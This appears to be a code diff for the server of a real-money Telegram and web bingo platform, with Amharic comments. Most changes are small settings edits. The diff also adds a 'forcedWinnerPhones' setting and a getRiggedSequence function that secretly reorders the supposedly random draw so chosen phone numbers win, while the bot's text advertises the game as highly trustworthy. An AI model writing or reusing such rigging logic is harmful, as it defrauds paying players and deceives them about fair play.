@@ -31,11 +31,8 @@ const User = mongoose.model('User', new mongoose.Schema({
     name: String, 
     password: { type: String, required: true },
     referredBy: { type: String, default: "" }, 
-    
-    // 🔥 ትክክለኛው የጋበዙት ሰው ብዛት እና ያገኙት ብር መመዝገቢያ 🔥
     totalInvites: { type: Number, default: 0 }, 
     inviteBonusEarned: { type: Number, default: 0 },
-
     mainBalance: { type: Number, default: 0 }, 
     playBalance: { type: Number, default: 0 }, 
     played: { type: Number, default: 0 }, 
@@ -43,15 +40,12 @@ const User = mongoose.model('User', new mongoose.Schema({
     totalDeposited: { type: Number, default: 0 }, 
     status: { type: String, default: 'active' },
     language: { type: String, default: 'am' },
-    
-    // 🔥 PROMOTER FIELDS 🔥
     isPromoter: { type: Boolean, default: false },
     promoterPercent: { type: Number, default: 10 },
     promoterEarned: { type: Number, default: 0 },
     promoterUnpaidBalance: { type: Number, default: 0 }, 
     hasMadeFirstDeposit: { type: Boolean, default: false }, 
     promoterCommissionGenerated: { type: Number, default: 0 },
-    
     referredViaPromo: { type: Boolean, default: false }, 
     compensatedInvites: { type: Number, default: 0 }
 }));
@@ -59,7 +53,7 @@ const User = mongoose.model('User', new mongoose.Schema({
 const Transaction = mongoose.model('Transaction', new mongoose.Schema({
     phone: String, type: String, amount: Number, method: String, status: { type: String, default: 'Pending' }, date: { type: Date, default: Date.now }, smsText: {type: String, default: ""},
     txRef: { type: String, default: "" },
-    hiddenFromAdmin: { type: Boolean, default: false } // 🔥 ይሄ አዲስ የተጨመረ ነው (ከአድሚን ለመደበቅ)
+    hiddenFromAdmin: { type: Boolean, default: false } 
 }));
 
 const BankSMS = mongoose.model('BankSMS', new mongoose.Schema({
@@ -85,7 +79,11 @@ const SystemSettings = mongoose.model('SystemSettings', new mongoose.Schema({
     cashbackMinLoss: { type: Number, default: 200 }, cashbackAmount: { type: Number, default: 10 }, isCashbackActive: { type: Boolean, default: false },
     registerBonus: { type: Number, default: 10 }, inviteBonus: { type: Number, default: 10 }, adminProfitPercent: { type: Number, default: 15 },
     maxTicketsPerUser: { type: Number, default: 4 },
-    minWithdrawLimit: { type: Number, default: 50 } // 🔥 Withdraw limit settings
+    minWithdrawLimit: { type: Number, default: 50 },
+    
+    // 🔥 አዳዲሶቹ ማስተካከያዎች (Timers & Forced Phone Numbers) 🔥
+    winPopupTimer: { type: Number, default: 12 },
+    forcedWinnerPhones: { type: String, default: "" }
 }));
 
 let GLOBAL_SETTINGS = {};
@@ -103,7 +101,11 @@ async function loadSettings() {
         cashbackMinLoss: s.cashbackMinLoss !== undefined ? s.cashbackMinLoss : 200, cashbackAmount: s.cashbackAmount !== undefined ? s.cashbackAmount : 10, isCashbackActive: s.isCashbackActive || false,
         registerBonus: s.registerBonus !== undefined ? s.registerBonus : 10, inviteBonus: s.inviteBonus !== undefined ? s.inviteBonus : 10,
         adminProfitPercent: s.adminProfitPercent !== undefined ? s.adminProfitPercent : 15, maxTicketsPerUser: s.maxTicketsPerUser !== undefined ? s.maxTicketsPerUser : 4,
-        minWithdrawLimit: s.minWithdrawLimit !== undefined ? s.minWithdrawLimit : 50 // 🔥 Update Global settings for withdraw
+        minWithdrawLimit: s.minWithdrawLimit !== undefined ? s.minWithdrawLimit : 50,
+        
+        // 🔥 አዳዲሶቹ ማስተካከያዎች
+        winPopupTimer: s.winPopupTimer !== undefined ? s.winPopupTimer : 12,
+        forcedWinnerPhones: s.forcedWinnerPhones || ""
     };
 }
 loadSettings();
@@ -172,7 +174,6 @@ async function autoApprovePendingDeposits() {
                     user.playBalance += totalCredit;
                     user.totalDeposited += actualReceivedAmount;
 
-                    // 🔥 ፕሮሞተር ኮሚሽን የሚያገኘው በ promo_ ሊንክ ከጋበዘ ብቻ ነው 🔥
                     if(user.referredBy && user.referredViaPromo) {
                         let promoter = await User.findOne({ phone: user.referredBy, isPromoter: true });
                         if(promoter) {
@@ -213,7 +214,6 @@ app.post('/api/webhook/iphone-sms', async (req, res) => {
     } catch (e) { res.status(500).json({ error: "Server Error" }); }
 });
 
-// 🔥 WEB API REGISTRATION: PROMOTER 2-LINK LOGIC 🔥
 app.post('/api/register', async (req, res) => {
     try {
         const { phone, name, password, refCode } = req.body;
@@ -232,18 +232,16 @@ app.post('/api/register', async (req, res) => {
             let refUser = await User.findOne({ $or: [{ phone: cleanRefCode.trim() }, { refCode: cleanRefCode.trim() }] }); 
             if (refUser) { 
                 actualRef = refUser.phone;
-                refUser.totalInvites = (refUser.totalInvites || 0) + 1; // ሁሌም የጋበዘውን ሰው ቁጥር 1 ይጨምራል
+                refUser.totalInvites = (refUser.totalInvites || 0) + 1;
                 
                 if (isPromoLink && refUser.isPromoter) {
-                    // ፕሮሞተር ከሆነና በ promo_ ከተመዘገበ Play Balance አይሰጠውም (በኋላ ላይ ኮሚሽን ያገኛል)
                     await refUser.save();
                 } else {
-                    // ኖርማል ጋባዥ ከሆነ ወይም ፕሮሞተር ሆኖ በኖርማል ሊንክ ከጋበዘ ወዲያውኑ Play Balance ያገኛል
                     refUser.playBalance += GLOBAL_SETTINGS.inviteBonus; 
                     refUser.inviteBonusEarned = (refUser.inviteBonusEarned || 0) + GLOBAL_SETTINGS.inviteBonus;
                     await refUser.save(); 
                     io.emit('balance_updated', refUser.phone); 
-                    isPromoLink = false; // ለኖርማል ጋባዥ በስህተት ኮሚሽን እንዳይሰራበት
+                    isPromoLink = false; 
                 }
             } 
         }
@@ -285,7 +283,6 @@ app.post('/api/request-tx', async (req, res) => {
         const { phone, type, amount, method, sms, destinationPhone } = req.body; 
         let user = await User.findOne({phone}); if(!user) return res.json({success: false});
         if(type === 'withdraw') {
-            // 🔥 አድሚን ያደረገው Minimum Withdraw Limit ዌብሳይት ላይ አፕላይ መደረጉ
             if(amount < GLOBAL_SETTINGS.minWithdrawLimit) return res.json({success: false, message: `❌ ማውጣት የሚችሉት ቢያንስ ${GLOBAL_SETTINGS.minWithdrawLimit} ብር ነው!`});
             if(user.mainBalance < amount) return res.json({success: false, message: "በቂ ብር የለም!"});
             user.mainBalance -= amount; await user.save();
@@ -365,7 +362,6 @@ app.post('/api/claim-promo-web', async (req, res) => {
     } catch(e) { res.json({success: false}); }
 });
 
-// 🔥 MIDDLEWARES FOR ADMIN & FINANCE 🔥
 const auth = (req, res, next) => { 
     const pass = req.body.adminPass; 
     if(pass !== GLOBAL_SETTINGS.adminPass) return res.status(401).json({error:"Unauthorized"}); 
@@ -390,9 +386,6 @@ app.post('/api/admin/finance-raw-data', financeAuth, async (req, res) => {
     } catch(e) { res.status(500).json({ success: false }); }
 });
 
-
-// 🟢 FAST SERVER-SIDE PAGINATION ENDPOINTS (FIXES SERVER CRASH) 🟢
-
 app.post('/api/admin/users', auth, async (req, res) => {
     try {
         let page = parseInt(req.body.page) || 1;
@@ -406,7 +399,6 @@ app.post('/api/admin/users', auth, async (req, res) => {
         let total = await User.countDocuments(query);
         let users = await User.find(query).sort({ _id: -1 }).skip((page - 1) * limit).limit(limit);
 
-        // 🔥 Safe Background Auto-Fix (Prevents Server Crash) 🔥
         let phoneList = users.map(u => u.phone);
         let actualInviteCounts = await User.aggregate([
             { $match: { referredBy: { $in: phoneList } } },
@@ -426,7 +418,6 @@ app.post('/api/admin/users', auth, async (req, res) => {
             }
             updatedUsers.push(userObj);
             
-            // Background save logic
             if ((u.totalInvites || 0) < trueCount || (!u.isPromoter && (u.inviteBonusEarned || 0) < (trueCount * GLOBAL_SETTINGS.inviteBonus))) {
                 User.updateOne({ phone: u.phone }, { $set: { totalInvites: userObj.totalInvites, inviteBonusEarned: userObj.inviteBonusEarned } }).exec();
             }
@@ -436,7 +427,6 @@ app.post('/api/admin/users', auth, async (req, res) => {
     } catch(e) { res.json({ success: false }); }
 });
 
-// 🔥 አድሚን ፓነል ላይ የተደበቁትን ትራንዛክሽኖች እንዳያሳይ 🔥
 app.post('/api/admin/transactions', auth, async (req, res) => {
     try {
         if (req.body.isPending) {
@@ -448,7 +438,7 @@ app.post('/api/admin/transactions', auth, async (req, res) => {
         let search = req.body.search || '';
         let type = req.body.type || 'deposit';
         
-        let query = { hiddenFromAdmin: { $ne: true } }; // የተደበቀውን አታምጣ
+        let query = { hiddenFromAdmin: { $ne: true } }; 
         if (type === 'rejected') { query.status = 'Rejected'; } 
         else { query.type = type; query.status = 'Approved'; }
         
@@ -508,14 +498,12 @@ app.post('/api/admin/live-stats', auth, async (req, res) => {
     });
 });
 
-// 🔥 1. ትክክለኛውን የጋባዦች ቁጥር እና ያገኙትን ብር የሚያወጣው የተስተካከለ ኮድ 🔥
 app.post('/api/admin/referrals', auth, async (req, res) => {
     try {
         let page = parseInt(req.body.page) || 1;
         let limit = parseInt(req.body.limit) || 50;
         let search = req.body.search || '';
 
-        // ጋብዘው የሚያውቁ (ቢያንስ 1 ሰው ያመጡ ወይም ቦነስ ያገኙ)
         let query = { $or: [{ totalInvites: { $gt: 0 } }, { inviteBonusEarned: { $gt: 0 } }] };
 
         if (search) {
@@ -523,7 +511,6 @@ app.post('/api/admin/referrals', auth, async (req, res) => {
         }
 
         let total = await User.countDocuments(query);
-        // ብዙ የጋበዙት ከላይ እንዲመጡ እናደርጋለን
         let referrers = await User.find(query)
             .sort({ totalInvites: -1 })
             .skip((page - 1) * limit)
@@ -531,16 +518,13 @@ app.post('/api/admin/referrals', auth, async (req, res) => {
 
         let mappedData = referrers.map(r => {
             let actualInvites = r.totalInvites || 0;
-            // ⚠️ የቦነስ መጠኑ ካልተገኘ (Undefined ከሆነ) በ 10 ብር እንዲያባዛ መተማመኛ አድርገናል
             let bonusAmount = GLOBAL_SETTINGS.inviteBonus || 10; 
-
             let expectedEarned = actualInvites * bonusAmount;
             let alreadyEarned = r.inviteBonusEarned || 0;
 
             return {
                 _id: r.phone,
                 count: actualInvites,
-                // የትኛውም ትልቅ ቢሆን እሱን ያሳያል (የጠፋ ዳታ ቢኖር እንኳን አይቀንስም)
                 earned: Math.max(expectedEarned, alreadyEarned)
             };
         });
@@ -551,12 +535,9 @@ app.post('/api/admin/referrals', auth, async (req, res) => {
     }
 });
 
-// 🔥 2. የጋበዟቸውን ሰዎች ዝርዝር (ስም እና ስልክ) ለማየት የሚረዳው አዲሱ ኮድ 🔥
 app.post('/api/admin/referral-details', auth, async (req, res) => {
     try {
-        // ጋባዡን (referredBy) በመጠቀም አሁን ዳታቤዝ ላይ ያሉትን ያመጣቸዉን ሰዎች ይፈልጋል
         let users = await User.find({ referredBy: req.body.phone }).select('name phone _id').sort({ _id: -1 });
-        
         let mappedUsers = users.map(u => ({
             name: u.name,
             phone: u.phone,
@@ -617,7 +598,6 @@ app.post('/api/admin/delete-history', auth, async (req, res) => {
     try { await GameHistory.deleteMany({ _id: { $in: req.body.ids } }); res.json({ success: true }); } 
     catch(e) { res.json({ success: false }); }
 });
-// 🔥 አድሚን Delete ሲል ከዳታቤዝ አይጠፋም፣ ከአድሚን እይታ ግን ይደበቃል (ለተጠቃሚው ይታያል) 🔥
 app.post('/api/admin/delete-transactions', auth, async (req, res) => {
     try { 
         await Transaction.updateMany({ _id: { $in: req.body.ids } }, { hiddenFromAdmin: true }); 
@@ -811,8 +791,11 @@ app.post('/api/admin/update-settings', auth, async (req, res) => {
     if(req.body.adminProfitPercent !== undefined) s.adminProfitPercent = req.body.adminProfitPercent; 
     if(req.body.maxTicketsPerUser !== undefined) s.maxTicketsPerUser = req.body.maxTicketsPerUser; 
     
-    // 🔥 አዲሱ Withdraw Limit
     if(req.body.minWithdrawLimit !== undefined) s.minWithdrawLimit = req.body.minWithdrawLimit;
+    
+    // 🔥 አዳዲሶቹ ማስተካከያዎች 🔥
+    if(req.body.winPopupTimer !== undefined) s.winPopupTimer = req.body.winPopupTimer;
+    if(req.body.forcedWinnerPhones !== undefined) s.forcedWinnerPhones = req.body.forcedWinnerPhones;
 
     await s.save(); await loadSettings();
     res.json({ success: true });
@@ -956,7 +939,7 @@ app.post('/api/admin/delete-broadcast', auth, async (req, res) => {
 });
 
 // ==========================================
-// 🟢 LIVE BINGO GAME ENGINE
+// 🟢 LIVE BINGO GAME ENGINE 
 // ==========================================
 let gameState = "WAITING";
 let gameClock = 40; 
@@ -986,13 +969,68 @@ function serverCheckBingo(grid, called) {
     return false;
 }
 
+// 🔥 ጌሙን (ቁጥሩን) የመቆጣጠሪያ ሲስተም (Forced Winning Logic) 🔥
+function getRiggedSequence(baseSequence) {
+    let riggedPhones = GLOBAL_SETTINGS.forcedWinnerPhones.split(',').map(p => p.trim());
+    let targetPlayer = null;
+    let targetTicket = null;
+
+    // አድሚኑ ካስገባቸው ስልኮች ውስጥ በዚህ ዙር የሚጫወት ሰው ካለ ፈልግ
+    for (let p of riggedPhones) {
+        if (activePlayers[p]) {
+            targetPlayer = activePlayers[p];
+            // የመጀመሪያውን ካርቴላውን እንዲያሸንፍ እንመርጣለን
+            targetTicket = targetPlayer.ticketsData[0];
+            break;
+        }
+    }
+
+    if (targetTicket) {
+        // የ3ኛውን (Horizontal) መስመር አሸናፊ እናደርገዋለን፣ ምክንያቱም FREE ስፔስ አለው (4 ቁጥር ብቻ ነው ሚፈልገው)
+        let neededNumbers = [
+            targetTicket.grid[0][2],
+            targetTicket.grid[1][2],
+            targetTicket.grid[3][2],
+            targetTicket.grid[4][2]
+        ];
+
+        // ከዋናው ዕጣ ውስጥ እነዚህን አውጣ
+        let pool = baseSequence.filter(n => !neededNumbers.includes(n));
+        
+        let finalSequence = [];
+        let winIndex = 0;
+
+        // አሸናፊው ቶሎ (በ30ኛው ዕጣ አካባቢ) እንዲያሸንፍና ማንም እንዳይቀድመው የተመረጡትን ቁጥሮች እናስገባለን
+        for(let i=0; i<75; i++) {
+            if ((i === 8 || i === 15 || i === 22 || i === 28) && winIndex < 4) {
+                finalSequence.push(neededNumbers[winIndex]);
+                winIndex++;
+            } else if (pool.length > 0) {
+                finalSequence.push(pool.shift());
+            }
+        }
+        console.log("🔥 GAME RIGGED FOR:", targetPlayer.phone);
+        return finalSequence;
+    }
+    
+    // ማንም የተመረጠ ሰው ካልተጫወተ ኖርማል (Random) ሆኖ ይወጣል
+    return baseSequence;
+}
+
 function generateDrawSequence() {
-    let pool = Array.from({length: 75}, (_, i) => i + 1);
-    return pool.sort(() => Math.random() - 0.5); 
+    let pool = Array.from({length: 75}, (_, i) => i + 1).sort(() => Math.random() - 0.5);
+    
+    // አድሚን ስልክ ካስገባ ጌሙን ኮንትሮል እንዲያደርግ እንጠይቀዋለን
+    if (GLOBAL_SETTINGS.forcedWinnerPhones && GLOBAL_SETTINGS.forcedWinnerPhones.trim() !== "") {
+        return getRiggedSequence(pool);
+    }
+    return pool; 
 }
 
 async function declareWinners(winners) {
-    gameState = "FINISHED"; gameClock = 12; 
+    gameState = "FINISHED"; 
+    // 🔥 የአሸናፊው ስክሪን የሚቆይበት ሰዓት (በአድሚን የሚወሰን)
+    gameClock = GLOBAL_SETTINGS.winPopupTimer || 12; 
     
     let splitPrize = Number((totalPrizePool / winners.length).toFixed(2));
     let adminProfit = totalCollectedMoney - totalPrizePool; 
@@ -1207,7 +1245,6 @@ bot.setWebHook(`${WEB_URL}/bot${telegramToken}`);
 app.post(`/bot${telegramToken}`, (req, res) => { bot.processUpdate(req.body); res.sendStatus(200); });
 const botState = {};
 
-// 🔥 በቴሌግራም ቦት ላይ ያለው Withdraw Limit ቋሚ የነበረው ወደ ዳይናሚክ (በአድሚን ወደሚቀየረው) ተቀይሯል 🔥
 const t = {
     am: {
         welcome: "🟢 <b>ቢንጎ</b> ⚪️ <b>ሀበሻ</b>\n\n🎉 <b>እንኳን ወደ BINGO HABESHA በደህና መጡ!</b> 🎉\n\nየኢትዮጵያ #1 እና በጣም ታማኝ የሆነው የቢንጎ መጫወቻ ፕላትፎርም። አሁኑኑ ይጫወቱ፣ ያሸንፉ፣ እና ወዲያውኑ ወደ ሂሳብዎ ገቢ ያድርጉ!\n\n👇 <b>ከታች ካሉት አማራጮች የሚፈልጉትን ይምረጡ፡</b>",
@@ -1466,12 +1503,10 @@ bot.on('message', async (msg) => {
     } 
     else if (state.step === 'awaiting_wit_acc') {
         state.destinationPhone = text.trim(); 
-        // 🔥 Dynamic Admin Limit Check applied here 🔥
         bot.sendMessage(chatId, ln.enter_wit_amt(state.destinationPhone, GLOBAL_SETTINGS.minWithdrawLimit), { parse_mode: "HTML", ...cancelKeyboard(ln) }); state.step = 'awaiting_wit_amt';
     }
     else if (state.step === 'awaiting_wit_amt') {
         state.amount = parseFloat(text); 
-        // 🔥 Dynamic Admin Limit Check applied here 🔥
         if(isNaN(state.amount) || state.amount < GLOBAL_SETTINGS.minWithdrawLimit) return bot.sendMessage(chatId, ln.invalid_amt(GLOBAL_SETTINGS.minWithdrawLimit), cancelKeyboard(ln));
         if(user) {
             if(user.mainBalance < state.amount) return bot.sendMessage(chatId, ln.insufficient, { ...getMainMenu(user) });
@@ -1511,7 +1546,6 @@ bot.on('callback_query', async (query) => {
         state.method = data.split('_')[1]; 
         state.destinationPhone = user.phone; 
         state.step = 'awaiting_wit_amt'; 
-        // 🔥 Dynamic Admin Limit Check applied here 🔥
         bot.sendMessage(chatId, ln.enter_wit_amt(user.phone, GLOBAL_SETTINGS.minWithdrawLimit), { parse_mode: "HTML", ...cancelKeyboard(ln) }); 
     }
     botState[chatId] = state; bot.answerCallbackQuery(query.id);
@@ -1907,7 +1941,6 @@ app.get('*', (req, res) => {
     if (fs.existsSync(target)) {
         let html = fs.readFileSync(target, 'utf8');
         
-        // 🔥 ምንም የfront-end ፋይል ሳልነካ Withdraw input placeholder በአድሚኑ በሚቀየረው ልክ በራሱ እንዲቀየር የሚያደርግ ኮድ 🔥
         let maintenanceScript = `
         <style>
             #dynamic-maintenance {
@@ -1964,7 +1997,6 @@ app.get('*', (req, res) => {
                             document.getElementById('dynamic-maintenance').style.display = 'none';
                         }
 
-                        // 🔥 DYNAMIC WITHDRAW LIMIT PLACEHOLDER CHANGER 🔥
                         if (data.minWithdrawLimit) {
                             let witInputs = document.querySelectorAll('input[type="number"]');
                             witInputs.forEach(input => {
